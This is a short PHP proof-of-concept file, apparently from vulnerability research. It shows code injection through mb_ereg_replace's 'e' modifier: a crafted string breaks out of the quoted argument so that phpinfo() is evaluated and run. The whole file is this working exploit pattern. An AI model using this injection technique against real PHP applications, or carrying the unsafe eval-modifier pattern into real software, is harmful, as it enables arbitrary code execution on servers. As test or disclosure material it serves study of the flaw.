<?php

function hi80vul() {}

$str = '\', phpinfo(), \'';
mb_ereg_replace('^(.*)$', 'hi80vul(\'\1\')', $str, 'e');

?>

